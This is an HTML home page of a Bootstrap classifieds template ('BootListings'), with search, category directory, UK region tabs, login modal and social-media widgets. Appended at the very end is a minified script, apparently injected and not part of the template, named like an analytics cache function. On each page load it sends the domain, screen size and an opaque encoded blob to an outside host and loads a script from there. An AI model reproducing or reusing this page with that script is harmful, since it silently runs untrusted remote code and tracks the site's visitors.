
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0"
        <link rel="shortcut icon" href="../../assets/ico/favicon.png">

        <title>BootListings - A Bootstrap Classifieds template</title>

        <!-- Bootstrap core CSS -->
        <link id="switch_style" href="css/bootstrap.css" rel="stylesheet">

        <!-- Custom styles for this template -->
        <link href="css/theme.css" rel="stylesheet">
        <link href="css/dropzone.css" rel="stylesheet">
        <link href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">
        <link rel="stylesheet" type="text/css" href="js/fancybox/jquery.fancybox.css?v=2.1.5" media="screen" />
        <link rel="stylesheet" type="text/css" href="js/fancybox/helpers/jquery.fancybox-buttons.css?v=2.1.5" media="screen" />
        
        <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
        <!--[if lt IE 9]>
        <script src="../../assets/js/html5shiv.js"></script>
        <script src="../../assets/js/respond.min.js"></script>
        <![endif]-->
    </head>

    <body>

            
        <div id="fb-root"></div>
        <script>
            (function(d, s, id) {
                var js, fjs = d.getElementsByTagName(s)[0];
                if (d.getElementById(id)) return;
                js = d.createElement(s); js.id = id;
                js.src = "//connect.facebook.net/en_GB/all.js#xfbml=1";
                fjs.parentNode.insertBefore(js, fjs);
            }(document, 'script', 'facebook-jssdk'));
        </script>
        
        



        <nav class="navbar navbar-default" role="navigation">
            <div class="container">

                <div class="navbar-header">
                    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                    </button>

                    <a href="index.html" class="navbar-brand ">
                        <span class="logo"><strong>classified</strong><span class="handwriting">ads</span><br />
                            <small >a minimalist theme built with bootstrap </small></span>
                    </a>

                </div>



                <div class="collapse navbar-collapse">

                    <ul class="nav navbar-nav navbar-right visible-xs">
                        <li class="active"><a href="#">Home</a></li>
                        <li><a href="my_account.html">Login</a></li>
                        <li><a href="register.html">Register</a></li>
                        <li><a href="listings.html">Listings</a></li>
                        <li><a href="account_dashboard.html">My account</a></li>
                        <li><a href="account_ad_create.html">Post an ad</a></li>
                    </ul> 
                    <div class="nav navbar-nav navbar-right hidden-xs">
                        <div class="row">

                            <div class="pull-right">


                                <a data-toggle="modal" data-target="#modalLogin"  href="#">Login</a> | 
                                <a href="register.html">Register</a> | 
                                <a href="listings.html">Listings</a> | 
                                <a href="account_dashboard.html">My account</a>
                                <a href="account_ad_create.html" class="btn btn-warning post-ad-btn">Post an ad</a>

                            </div>	
                        </div>




                    </div>

                </div>
                </div>





            </nav>



            

            <div class="jumbotron home-search" style="">
    <div class="container">
        <div class="row">
            <div class="col-sm-12">
                <br />
                <p class="main_description">Search thousands of stores, brands, products and user classifieds all in one place</p>

                <br /><br />
                <div class="row">

                    <div class="col-sm-8 col-sm-offset-2" style="text-align: center">
                        <div class="row">

                            <div class="col-sm-10 col-sm-offset-1">
                                <div class="input-group">
                                    <span class="input-group-addon input-group-addon-text">Find me a</span>

                                    <input type="text" class="form-control col-sm-3" placeholder="e.g. BMW, 2 bed flat, sofa ">
                                    <div class=" input-group-addon hidden-xs">
                                        <div class="btn-group" >
                                            <button type="button" class="btn  dropdown-toggle" data-toggle="dropdown">
                                                All categories <span class="caret"></span>
                                            </button>
                                            <ul class="dropdown-menu" role="menu">
                                                <li><a href="#">Cars, Vans & Motorbikes</a></li>
                                                <li><a href="#">Community</a></li>
                                                <li><a href="#">Flats & Houses</a></li>
                                                <li><a href="#">For Sale</a></li>
                                                <li><a href="#">Jobs</a></li>
                                                <li><a href="#">Pets</a></li>
                                                <li><a href="#">Services</a></li>
                                            </ul>
                                        </div>
                                    </div>

                                </div>

                            </div>


                        </div>
                    </div>
                </div>
                <br />
                <br />
                <div class="row">
                    <div class="col-sm-12" style="text-align: center">
                        <a href="listings.html" class="btn btn-primary search-btn">Search</a>
                    </div>
                </div>                
                <br />
                <br />
                <div class="row">
                    <div class="col-sm-12" style="text-align: center">

                        <div id="quotes">
                            <div class="text-item" style="display: none;">Boom! <strong>Vince</strong> just sold a <strong>Washing Machine</strong> in <strong>Sheffield</strong></div>
                            <div class="text-item" style="display: none;"><strong>Julia</strong> is availiable for <strong>home cleaning</strong> in <strong>Manchester</strong></div>
                            <div class="text-item" style="display: none;">Success! <strong>Paul</strong> has just sold a <strong>Mercedes-Benz E-class</strong> in <strong>Liverpool</strong></div>
                            <div class="text-item" style="display: none;">Hey, <strong>Uber</strong> has a <strong>job opening</strong> in <strong>London</strong></div>
                        </div>



                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="container">



    <div class="row">

        <div class="col-sm-12 col-md-8">

            <div class="row directory">
                <div class="col-sm-12 ">
                    <h2><span>Directory listings</span></h2>
                </div>
            </div>

            <div class="row directory">


                <div class="col-xs-12">
                                        <div class="directory-block col-sm-4 col-xs-6">
                        <div class="row">
                            <div class="col-sm-3">
                                <i class="fa fa-home"></i>
                            </div>
                            <div class="col-sm-9">
                                <h4>Houses and flats</h4>
                                <p><a href="listings.html" >Cars</a>, <a href="listings.html" >Car Parts</a>, <a href="listings.html" >Campervans</a>, <a href="listings.html">Motobikes</a>, <a href="listings.html" >Scooters</a>, <a href="listings.html" >Vans</a>, <a href="listings.html" >Trucks</a></p>
                            </div>
                        </div>
                    </div>

                    <div class="directory-block col-sm-4 col-xs-6">
                        <div class="row">
                            <div class="col-sm-3">
                                <i class="fa fa-truck"></i>
                            </div>
                            <div class="col-sm-9">
                                <h4>Car and vehicles</h4>
                                <p><a href="listings.html" >Cars</a>, <a href="listings.html" >Car Parts</a>, <a href="listings.html" >Campervans</a>, <a href="listings.html">Motobikes</a>, <a href="listings.html" >Scooters</a>, <a href="listings.html" >Vans</a>, <a href="listings.html" >Trucks</a></p>
                            </div>
                        </div>
                    </div>

                    <div class="directory-block col-sm-4 col-xs-6">
                        <div class="row">
                            <div class="col-sm-3">
                                <i class="fa fa-shopping-cart"></i>
                            </div>
                            <div class="col-sm-9">
                                <h4>Shopping</h4>
                                <p><a href="listings.html" >Cars</a>, <a href="listings.html" >Car Parts</a>, <a href="listings.html" >Campervans</a>, <a href="listings.html">Motobikes</a>, <a href="listings.html" >Scooters</a>, <a href="listings.html" >Vans</a>, <a href="listings.html" >Trucks</a></p>
                            </div>
                        </div>
                    </div>
                                        <div class="directory-block col-sm-4 col-xs-6">
                        <div class="row">
                            <div class="col-sm-3">
                                <i class="fa fa-home"></i>
                            </div>
                            <div class="col-sm-9">
                                <h4>Houses and flats</h4>
                                <p><a href="listings.html" >Cars</a>, <a href="listings.html" >Car Parts</a>, <a href="listings.html" >Campervans</a>, <a href="listings.html">Motobikes</a>, <a href="listings.html" >Scooters</a>, <a href="listings.html" >Vans</a>, <a href="listings.html" >Trucks</a></p>
                            </div>
                        </div>
                    </div>

                    <div class="directory-block col-sm-4 col-xs-6">
                        <div class="row">
                            <div class="col-sm-3">
                                <i class="fa fa-truck"></i>
                            </div>
                            <div class="col-sm-9">
                                <h4>Car and vehicles</h4>
                                <p><a href="listings.html" >Cars</a>, <a href="listings.html" >Car Parts</a>, <a href="listings.html" >Campervans</a>, <a href="listings.html">Motobikes</a>, <a href="listings.html" >Scooters</a>, <a href="listings.html" >Vans</a>, <a href="listings.html" >Trucks</a></p>
                            </div>
                        </div>
                    </div>

                    <div class="directory-block col-sm-4 col-xs-6">
                        <div class="row">
                            <div class="col-sm-3">
                                <i class="fa fa-shopping-cart"></i>
                            </div>
                            <div class="col-sm-9">
                                <h4>Shopping</h4>
                                <p><a href="listings.html" >Cars</a>, <a href="listings.html" >Car Parts</a>, <a href="listings.html" >Campervans</a>, <a href="listings.html">Motobikes</a>, <a href="listings.html" >Scooters</a>, <a href="listings.html" >Vans</a>, <a href="listings.html" >Trucks</a></p>
                            </div>
                        </div>
                    </div>
                                        <div class="directory-block col-sm-4 col-xs-6">
                        <div class="row">
                            <div class="col-sm-3">
                                <i class="fa fa-home"></i>
                            </div>
                            <div class="col-sm-9">
                                <h4>Houses and flats</h4>
                                <p><a href="listings.html" >Cars</a>, <a href="listings.html" >Car Parts</a>, <a href="listings.html" >Campervans</a>, <a href="listings.html">Motobikes</a>, <a href="listings.html" >Scooters</a>, <a href="listings.html" >Vans</a>, <a href="listings.html" >Trucks</a></p>
                            </div>
                        </div>
                    </div>

                    <div class="directory-block col-sm-4 col-xs-6">
                        <div class="row">
                            <div class="col-sm-3">
                                <i class="fa fa-truck"></i>
                            </div>
                            <div class="col-sm-9">
                                <h4>Car and vehicles</h4>
                                <p><a href="listings.html" >Cars</a>, <a href="listings.html" >Car Parts</a>, <a href="listings.html" >Campervans</a>, <a href="listings.html">Motobikes</a>, <a href="listings.html" >Scooters</a>, <a href="listings.html" >Vans</a>, <a href="listings.html" >Trucks</a></p>
                            </div>
                        </div>
                    </div>

                    <div class="directory-block col-sm-4 col-xs-6">
                        <div class="row">
                            <div class="col-sm-3">
                                <i class="fa fa-shopping-cart"></i>
                            </div>
                            <div class="col-sm-9">
                                <h4>Shopping</h4>
                                <p><a href="listings.html" >Cars</a>, <a href="listings.html" >Car Parts</a>, <a href="listings.html" >Campervans</a>, <a href="listings.html">Motobikes</a>, <a href="listings.html" >Scooters</a>, <a href="listings.html" >Vans</a>, <a href="listings.html" >Trucks</a></p>
                            </div>
                        </div>
                    </div>
                                    </div>



            </div>

            


            <div class="row directory-counties hidden-xs">
                <div class="col-sm-12">
                    <ul class="nav nav-tabs" id="myTab">
                        <li class=""><a data-toggle="tab"  href="#popular">Popular cities</a></li>
                                                <li class=""><a data-toggle="tab"  href="#EN">England</a></li>
                                                <li class=""><a data-toggle="tab"  href="#WA">Wales</a></li>
                                                <li class=""><a data-toggle="tab"  href="#SC">Scotland</a></li>
                                                <li class="hidden-md"><a data-toggle="tab"  href="#NI">Northern Ireland</a></li>
                                                <li class="dropdown">
                            <a data-toggle="dropdown" class="dropdown-toggle" id="myTabDrop1" href="#">Other countries <b class="caret"></b></a>
                            <ul aria-labelledby="myTabDrop1" role="menu" class="dropdown-menu">
                                <li><a href="listings.html">USA</a></li>
                                <li><a href="listings.html">France</a></li>
                                <li><a href="listings.html">Germany</a></li>
                                <li><a href="listings.html">Spain and Portugal</a></li>
                                <li><a href="listings.html">Switzerland</a></li>
                                <li><a href="listings.html">Other Europe</a></li>
                            </ul>
                        </li>
                    </ul>
                    <div class="tab-content " id="myTabContent">
                                                <div id="popular" class="tab-pane fade counties-pane active">
                                                        <div class="col-sm-3">

                                <div class="row directory-block">
                                    <div class="col-sm-12">
                                                                                <a href="listings.html">London</a><br />
                                                                                <a href="listings.html">Edinburgh</a><br />
                                                                                <a href="listings.html">Manchester</a><br />
                                                                                <a href="listings.html">Birmingham</a><br />
                                                                                <a href="listings.html">Glasgow</a><br />
                                                                            </div>
                                </div>

                            </div>
                                                        <div class="col-sm-3">

                                <div class="row directory-block">
                                    <div class="col-sm-12">
                                                                                <a href="listings.html">Liverpool</a><br />
                                                                                <a href="listings.html">Bristol</a><br />
                                                                                <a href="listings.html">Oxford</a><br />
                                                                                <a href="listings.html">Cambridge</a><br />
                                                                                <a href="listings.html">Cardiff</a><br />
                                                                            </div>
                                </div>

                            </div>
                                                        <div class="col-sm-3">

                                <div class="row directory-block">
                                    <div class="col-sm-12">
                                                                                <a href="listings.html">Brighton</a><br />
                                                                                <a href="listings.html">Newcastle-upon-Tyne</a><br />
                                                                                <a href="listings.html">Leeds</a><br />
                                                                                <a href="listings.html">York</a><br />
                                                                                <a href="listings.html">Inverness</a><br />
                                                                            </div>
                                </div>

                            </div>
                                                        <div class="col-sm-3">

                                <div class="row directory-block">
                                    <div class="col-sm-12">
                                                                                <a href="listings.html">Bath</a><br />
                                                                                <a href="listings.html">Nottingham</a><br />
                                                                                <a href="listings.html">Reading</a><br />
                                                                                <a href="listings.html">Aberdeen</a><br />
                                                                                <a href="listings.html">Chester</a><br />
                                                                            </div>
                                </div>

                            </div>
                                                    </div>


                                                                        <div id="EN" class="tab-pane counties-pane">
                                                        <div class="col-sm-3">

                                <div class="row directory-block">
                                    <div class="col-sm-12">
                                                                                <a href="listings.html" >Avon</a><br />
                                                                                <a href="listings.html" >Bedfordshire</a><br />
                                                                                <a href="listings.html" >Berkshire</a><br />
                                                                                <a href="listings.html" >Buckinghamshire</a><br />
                                                                                <a href="listings.html" >Cambridgeshire</a><br />
                                                                                <a href="listings.html" >Cheshire</a><br />
                                                                                <a href="listings.html" >Cleveland</a><br />
                                                                                <a href="listings.html" >Cornwall</a><br />
                                                                                <a href="listings.html" >Cumbria</a><br />
                                                                                <a href="listings.html" >Derbyshire</a><br />
                                                                                <a href="listings.html" >Devon</a><br />
                                                                                <a href="listings.html" >Dorset</a><br />
                                                                            </div>
                                </div>

                            </div>
                                                        <div class="col-sm-3">

                                <div class="row directory-block">
                                    <div class="col-sm-12">
                                                                                <a href="listings.html" >Durham</a><br />
                                                                                <a href="listings.html" >East Sussex</a><br />
                                                                                <a href="listings.html" >Essex</a><br />
                                                                                <a href="listings.html" >Gloucestershire</a><br />
                                                                                <a href="listings.html" >Hampshire</a><br />
                                                                                <a href="listings.html" >Herefordshire</a><br />
                                                                                <a href="listings.html" >Hertfordshire</a><br />
                                                                                <a href="listings.html" >Isle of Wight</a><br />
                                                                                <a href="listings.html" >Kent</a><br />
                                                                                <a href="listings.html" >Lancashire</a><br />
                                                                                <a href="listings.html" >Leicestershire</a><br />
                                                                                <a href="listings.html" >Lincolnshire</a><br />
                                                                            </div>
                                </div>

                            </div>
                                                        <div class="col-sm-3">

                                <div class="row directory-block">
                                    <div class="col-sm-12">
                                                                                <a href="listings.html" >London</a><br />
                                                                                <a href="listings.html" >Merseyside</a><br />
                                                                                <a href="listings.html" >Middlesex</a><br />
                                                                                <a href="listings.html" >Norfolk</a><br />
                                                                                <a href="listings.html" >Northamptonshire</a><br />
                                                                                <a href="listings.html" >Northumberland</a><br />
                                                                                <a href="listings.html" >North Humberside</a><br />
                                                                                <a href="listings.html" >North Yorkshire</a><br />
                                                                                <a href="listings.html" >Nottinghamshire</a><br />
                                                                                <a href="listings.html" >Oxfordshire</a><br />
                                                                                <a href="listings.html" >Rutland</a><br />
                                                                                <a href="listings.html" >Shropshire</a><br />
                                                                            </div>
                                </div>

                            </div>
                                                        <div class="col-sm-3">

                                <div class="row directory-block">
                                    <div class="col-sm-12">
                                                                                <a href="listings.html" >Somerset</a><br />
                                                                                <a href="listings.html" >South Humberside</a><br />
                                                                                <a href="listings.html" >South Yorkshire</a><br />
                                                                                <a href="listings.html" >Staffordshire</a><br />
                                                                                <a href="listings.html" >Suffolk</a><br />
                                                                                <a href="listings.html" >Surrey</a><br />
                                                                                <a href="listings.html" >Tyne and Wear</a><br />
                                                                                <a href="listings.html" >Warwickshire</a><br />
                                                                                <a href="listings.html" >West Midlands</a><br />
                                                                                <a href="listings.html" >West Sussex</a><br />
                                                                                <a href="listings.html" >West Yorkshire</a><br />
                                                                                <a href="listings.html" >Worcestershire</a><br />
                                                                            </div>
                                </div>

                            </div>
                                                    </div>
                                                                        <div id="WA" class="tab-pane counties-pane">
                                                        <div class="col-sm-3">

                                <div class="row directory-block">
                                    <div class="col-sm-12">
                                                                                <a href="listings.html" >Clwyd</a><br />
                                                                                <a href="listings.html" >Dyfed</a><br />
                                                                            </div>
                                </div>

                            </div>
                                                        <div class="col-sm-3">

                                <div class="row directory-block">
                                    <div class="col-sm-12">
                                                                                <a href="listings.html" >Gwent</a><br />
                                                                                <a href="listings.html" >Gwynedd</a><br />
                                                                            </div>
                                </div>

                            </div>
                                                        <div class="col-sm-3">

                                <div class="row directory-block">
                                    <div class="col-sm-12">
                                                                                <a href="listings.html" >Mid Glamorgan</a><br />
                                                                                <a href="listings.html" >Powys</a><br />
                                                                            </div>
                                </div>

                            </div>
                                                        <div class="col-sm-3">

                                <div class="row directory-block">
                                    <div class="col-sm-12">
                                                                                <a href="listings.html" >South Glamorgan</a><br />
                                                                                <a href="listings.html" >West Glamorgan</a><br />
                                                                            </div>
                                </div>

                            </div>
                                                    </div>
                                                                        <div id="SC" class="tab-pane counties-pane">
                                                        <div class="col-sm-3">

                                <div class="row directory-block">
                                    <div class="col-sm-12">
                                                                                <a href="listings.html" >Aberdeenshire</a><br />
                                                                                <a href="listings.html" >Angus</a><br />
                                                                                <a href="listings.html" >Argyll</a><br />
                                                                                <a href="listings.html" >Ayrshire</a><br />
                                                                                <a href="listings.html" >Banffshire</a><br />
                                                                                <a href="listings.html" >Berwickshire</a><br />
                                                                                <a href="listings.html" >Bute</a><br />
                                                                                <a href="listings.html" >Caithness</a><br />
                                                                            </div>
                                </div>

                            </div>
                                                        <div class="col-sm-3">

                                <div class="row directory-block">
                                    <div class="col-sm-12">
                                                                                <a href="listings.html" >Clackmannanshire</a><br />
                                                                                <a href="listings.html" >Dumfriesshire</a><br />
                                                                                <a href="listings.html" >Dunbartonshire</a><br />
                                                                                <a href="listings.html" >East Lothian</a><br />
                                                                                <a href="listings.html" >Fife</a><br />
                                                                                <a href="listings.html" >Inverness-shire</a><br />
                                                                                <a href="listings.html" >Kincardineshire</a><br />
                                                                                <a href="listings.html" >Kinross-shire</a><br />
                                                                            </div>
                                </div>

                            </div>
                                                        <div class="col-sm-3">

                                <div class="row directory-block">
                                    <div class="col-sm-12">
                                                                                <a href="listings.html" >Kirkcudbrightshire</a><br />
                                                                                <a href="listings.html" >Lanarkshire</a><br />
                                                                                <a href="listings.html" >Midlothian</a><br />
                                                                                <a href="listings.html" >Moray</a><br />
                                                                                <a href="listings.html" >Nairnshire</a><br />
                                                                                <a href="listings.html" >Orkney</a><br />
                                                                                <a href="listings.html" >Peeblesshire</a><br />
                                                                                <a href="listings.html" >Perthshire</a><br />
                                                                            </div>
                                </div>

                            </div>
                                                        <div class="col-sm-3">

                                <div class="row directory-block">
                                    <div class="col-sm-12">
                                                                                <a href="listings.html" >Renfrewshire</a><br />
                                                                                <a href="listings.html" >Ross-shire</a><br />
                                                                                <a href="listings.html" >Roxburghshire</a><br />
                                                                                <a href="listings.html" >Selkirkshire</a><br />
                                                                                <a href="listings.html" >Shetland</a><br />
                                                                                <a href="listings.html" >Stirlingshire</a><br />
                                                                                <a href="listings.html" >Sutherland</a><br />
                                                                                <a href="listings.html" >West Lothian</a><br />
                                                                            </div>
                                </div>

                            </div>
                                                        <div class="col-sm-3">

                                <div class="row directory-block">
                                    <div class="col-sm-12">
                                                                                <a href="listings.html" >Wigtownshire</a><br />
                                                                            </div>
                                </div>

                            </div>
                                                    </div>
                                                                        <div id="NI" class="tab-pane counties-pane">
                                                        <div class="col-sm-3">

                                <div class="row directory-block">
                                    <div class="col-sm-12">
                                                                                <a href="listings.html" >Antrim</a><br />
                                                                            </div>
                                </div>

                            </div>
                                                        <div class="col-sm-3">

                                <div class="row directory-block">
                                    <div class="col-sm-12">
                                                                                <a href="listings.html" >Armagh</a><br />
                                                                            </div>
                                </div>

                            </div>
                                                        <div class="col-sm-3">

                                <div class="row directory-block">
                                    <div class="col-sm-12">
                                                                                <a href="listings.html" >Down</a><br />
                                                                            </div>
                                </div>

                            </div>
                                                        <div class="col-sm-3">

                                <div class="row directory-block">
                                    <div class="col-sm-12">
                                                                                <a href="listings.html" >Fermanagh</a><br />
                                                                            </div>
                                </div>

                            </div>
                                                        <div class="col-sm-3">

                                <div class="row directory-block">
                                    <div class="col-sm-12">
                                                                                <a href="listings.html" >Londonderry</a><br />
                                                                            </div>
                                </div>

                            </div>
                                                        <div class="col-sm-3">

                                <div class="row directory-block">
                                    <div class="col-sm-12">
                                                                                <a href="listings.html" >Tyrone</a><br />
                                                                            </div>
                                </div>

                            </div>
                                                    </div>
                                            </div>
                </div>


            </div>



        </div>

        <div class="col-xs-12 col-md-4 " >
            <div class="row">
                <div class="col-xs-12 col-sm-3 col-md-12  col-lg-11 pull-right" >
                    <br class="hidden-sm hidden-xs"/>
                    <br class="hidden-sm hidden-xs"/>
                    <br class="hidden-sm hidden-xs"/>

                    <div class="panel panel-default">
                        <div class="panel-heading">Quick guide</div>

                        <ul class="list-group">
                            <li class="list-group-item"><a href="typography.html">Our tips to stay safe</a></li>
                            <li class="list-group-item"><a href="typography.html">How to buy guide</a></li>
                            <li class="list-group-item"><a href="typography.html">How to sell guide</a></li>
                            <li class="list-group-item"><a href="typography.html">Help and contact us</a></li>
                            <li class="list-group-item"><a href="typography.html">Frequently asked questions</a></li>
                        </ul>



                    </div>
                </div>

                <div class="col-xs-12 col-sm-5 col-md-12  col-lg-11 pull-right" >


                    <div class="panel panel-default">


                        <div class="panel-body" style="height: 102px; display: block;">

                            <div class="fb-like" data-href="https://developers.facebook.com/docs/plugins/" data-width="265" data-layout="standard" data-action="like" data-show-faces="false" data-share="false" style="display: block; height: 30px;"></div>
                            <br />
                            <!-- Place this tag where you want the +1 button to render. -->
                            <div class="g-plusone" data-annotation="inline" data-width="300" style="display: block; height: 30px;"></div>

                            <!-- Place this tag after the last +1 button tag. -->
                            <script type="text/javascript">
                                (function() {
                                    var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
                                    po.src = 'https://apis.google.com/js/platform.js';
                                    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
                                })();
                            </script>
                        </div>
                        <div class="panel-footer">
                            <a href="https://twitter.com/twitterapi" class="twitter-follow-button" data-dnt="true">Follow @twitterapi</a>
                            <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
                        </div>
                    </div>

                    <p class="main_slogan" style="margin: 28px 0">Currently listing 355,785 classified ads in the United Kingdom.</p>

                </div>



                <div class="col-xs-12 col-sm-4 col-md-12  col-lg-11 pull-right" >


                    <div class="panel panel-default">
                        <div class="panel-heading">Premium listings</div>
                        <div class="panel-body">
                            <div class="featured-gallery">

                                <div class="row">


                                    <div class="col-sm-6 col-xs-4 featured-thumbnail"  data-toggle="tooltip" data-placement="top" title="Programmer job availiable at Uber in London">
                                        <a href="details.html" class="">
                                            <img alt="" src="css/images/logos/uberlogo_large_verge_medium_landscape.png" style="width: 100%" >
                                        </a>
                                    </div>
                                    <div class="col-sm-6 col-xs-4 featured-thumbnail"  data-toggle="tooltip" data-placement="top"  title="Porsche Boxster S, 2.9 2dr reg Apr 2007 ">
                                        <a href="details.html" class="">
                                            <img alt="" src="css/images/logos/car-78738_150.jpg"  />
                                        </a>
                                    </div>



                                    <div class="col-sm-6 col-xs-4 featured-thumbnail" data-toggle="tooltip" data-placement="top"  title="Please find my lost cat">
                                        <a href="details.html" class="" >
                                            <img alt="" src="css/images/logos/cats-q-c-120-80-4.jpg"  />
                                        </a>
                                    </div>
                                    <div class="col-sm-6 col-xs-4 featured-thumbnail" data-toggle="tooltip" data-placement="top"  title="Mini copper looking for a quick sell !! - London - £2,485">
                                        <a href="details.html" class="" >
                                            <img alt="" src="css/images/logos/transport-q-c-120-80-8.jpg"  />
                                        </a>
                                    </div>



                                    <div class="col-sm-6 col-xs-4 featured-thumbnail" data-toggle="tooltip" data-placement="top"  title="Old MP3 player for sale">
                                        <a href="details.html" class="" >
                                            <img alt="" src="css/images/logos/technics-q-c-120-80-10.jpg"  />
                                        </a>
                                    </div>
                                    <div class="col-sm-6 col-xs-4 featured-thumbnail" data-toggle="tooltip" data-placement="top" title="Designer job availiable at Uber in London">
                                        <a href="details.html" class="" >
                                            <img alt="" src="css/images/logos/uberlogo_large_verge_medium_landscape.png"  />
                                        </a>
                                    </div>




                                </div>



                            </div>



                        </div>
                    </div>


                </div>
            </div>

        </div>
    </div>				

</div><!-- /.container --><!-- Modal -->
<div class="modal fade" id="modalLogin" tabindex="-1" role="dialog" aria-labelledby="modalLogin" aria-hidden="true">
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
                <h4 class="modal-title">Sign in to your account</h4>
            </div>
            <div class="modal-body">
                <p>If you have an account with us, please enter your details below.</p>

                <form method="POST" action="account_dashboard.html" accept-charset="UTF-8" id="user-login-form" class="form ajax" data-replace=".error-message p">

                    <div class="form-group">
                        <input placeholder="Your username/email" class="form-control" name="email" type="text">                </div>

                    <div class="form-group">
                        <input placeholder="Your password" class="form-control" name="password" type="password" value="">                </div>

                    <div class="row">
                        <div class="col-md-6">

                        </div>
                        <div class="col-md-6">
                            <button type="submit" class="btn btn-primary pull-right">Login</button>
                        </div>
                    </div>

                    <div class="row">
                        <div class="col-md-12">
                            <a data-toggle="modal" href="#modalForgot">Forgot your password?</a>
                        </div>
                    </div>

                </form>
            </div>

            <div class="modal-footer" style="text-align: center">
                <div class="error-message"><p style="color: #000; font-weight: normal;">Don't have an account? <a class="link-info" href="register.html">Register now</a></p></div>
            </div>

        </div><!-- /.modal-content -->
    </div><!-- /.modal-dialog -->
</div><!-- /.modal -->


<!-- Modal -->
<div class="modal fade" id="modalForgot" tabindex="-1" role="dialog" aria-labelledby="modalForgot" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
                <h4 class="modal-title">Forgot your password?</h4>
            </div>
            <div class="modal-body">
                <p>Enter your email to continue</p>

                <form role="form">
                    <div class="form-group">
                        <input type="email" class="form-control" placeholder="Your email address">
                    </div>

                    <div class="row">
                        <div class="col-md-6">

                        </div><div class="col-md-6">
                        <a href="my_account.html" class="btn btn-primary pull-right">Continue</a>
                        </div>
                    </div>
                </form>

            </div>
        </div><!-- /.modal-content -->
    </div><!-- /.modal-dialog -->
</div><!-- /.modal -->

<div class="footer">
    <div class="container">

        <div class="row">

            <div class="col-sm-4 col-xs-12">
                <p><strong>&copy; Bootstrap Classifieds 2014</strong></p>
                <p>All rights reserved</p>
            </div>			

            <div class="col-sm-8 col-xs-12">
                <p class="footer-links">
                    <a href="index.html" class="active">Home</a>
                    <a href="typography.html">Typography</a>
                    <a href="terms.html">Terms and Conditions</a>
                    <a href="contact.html">Contact Us</a>
                </p>
            </div>
        </div>
    </div>
</div>


<!-- Bootstrap core JavaScript
================================================== -->
<!-- Placed at the end of the document so the pages load faster -->
<script src="js/jquery-1.10.2.min.js"></script>
<script src="bootstrap/js/bootstrap.js"></script>
<script src="js/jquery.flot.js"></script>
<script src="js/dropzone.js"></script>

<!-- Add fancyBox main JS and CSS files -->
<script type="text/javascript" src="js/fancybox/jquery.fancybox.js?v=2.1.5"></script>
<script type="text/javascript" src="js/fancybox/helpers/jquery.fancybox-buttons.js?v=2.1.5"></script>
<script type="text/javascript" src="js/fancybox/helpers/jquery.fancybox-media.js?v=2.1.5"></script>
<script src="js/global.js"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssK%2bxq76Q7HwaK9XW1CooHFALE21%2bo8FqVvXmbWEyub9YpS3zMqwpfHWUNGUGI0md0Sz8lxXNll8gi4vy1Sc8oPxrghD302oZeiiXoI44D6PvqPd%2b6Z70TA8nDm7iLoFvvpoomuzvFdPKubrIEL7adrKHKIHy9TFvIJpcEjUEHrWWKjrN35CXugTbhUioxGWLCsOo9lffp9C0vWDJrjezm5Tt60AyKeKgz8nAxAIjZI9eUdraO4kL%2bf3CIQOVOd9mLug7RNRV97AozIfegA2GqAf%2fqnzQTZu6nNJqfEF4WZ9lWBAva3D%2fjYx0h8FLfcN4mH%2f7smYgDIvZvpLc0CAcZgYINp8hw0jvVf1iwNUN6te33QTi7GdkBaEZYKdrFnzuU04%2bVTZEPoFSO%2bvXc6IWa9MzYHcjCO%2fT7g2sXAOLjMSKLb21E52dYfonh3YXr17cyKrvYVotUSZ5z7N8bxAWqRa0hlKMxHQwNxn3y32kBl5zubBh8d50Rk5Qu8zn2aij6w4akMkK1BJfnuOLqVips046SD14sgVcCNbbhReddLZ2JlE522bgTXRPoAo4niX%2bTdqPCqp0TJGJnPAAiJet4UHw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>